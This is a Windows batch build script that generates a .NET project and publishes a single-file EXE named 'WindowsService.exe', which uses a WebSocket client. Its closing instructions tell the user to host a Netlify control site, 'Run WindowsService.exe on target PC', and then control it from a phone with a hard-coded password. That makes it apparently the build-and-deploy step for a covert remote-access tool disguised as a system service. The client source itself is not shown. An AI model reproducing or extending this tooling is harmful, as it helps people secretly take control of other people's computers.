@echo off
echo ===== FIXED BUILD =====
echo.

echo Cleaning previous builds...
if exist "bin" rmdir /s /q "bin"
if exist "dist" rmdir /s /q "dist"
if exist "obj" rmdir /s /q "obj"

echo Creating proper project file...
(
echo ^<Project Sdk="Microsoft.NET.Sdk"^>
echo   ^<PropertyGroup^>
echo     ^<OutputType^>WinExe^</OutputType^>
echo     ^<TargetFramework^>net8.0-windows^</TargetFramework^>
echo     ^<UseWindowsForms^>true^</UseWindowsForms^>
echo     ^<ImplicitUsings^>enable^</ImplicitUsings^>
echo     ^<Nullable^>enable^</Nullable^>
echo     ^<PublishSingleFile^>true^</PublishSingleFile^>
echo     ^<SelfContained^>true^</SelfContained^>
echo     ^<RuntimeIdentifier^>win-x64^</RuntimeIdentifier^>
echo     ^<AssemblyName^>WindowsService^</AssemblyName^>
echo   ^</PropertyGroup^>
echo   ^<ItemGroup^>
echo     ^<PackageReference Include="System.Net.WebSockets.Client" Version="4.3.2" /^>
echo   ^</ItemGroup^>
echo ^</Project^>
) > RemoteClient.csproj

echo Building EXE...
dotnet publish -c Release -r win-x64 --self-contained true -p:PublishSingleFile=true -o dist

if exist "dist\WindowsService.exe" (
    echo.
    echo ✅ SUCCESS: WindowsService.exe created!
    echo.
    echo 📱 NEXT STEPS:
    echo 1. Deploy website folder to Netlify
    echo 2. Get your site URL (like: https://your-app.netlify.app)
    echo 3. In Program.cs replace YOUR-APP with your actual app name
    echo 4. In index.html replace YOUR-APP with your actual app name  
    echo 5. Rebuild EXE with: build.bat
    echo 6. Run WindowsService.exe on target PC
    echo 7. Open site on phone - password: shaman666
    echo.
    echo 📁 Files in dist folder:
    dir dist
) else (
    echo.
    echo ❌ BUILD FAILED
    echo Try installing .NET 8.0 SDK
    echo Download from: https://dotnet.microsoft.com/download/dotnet/8.0
)

pause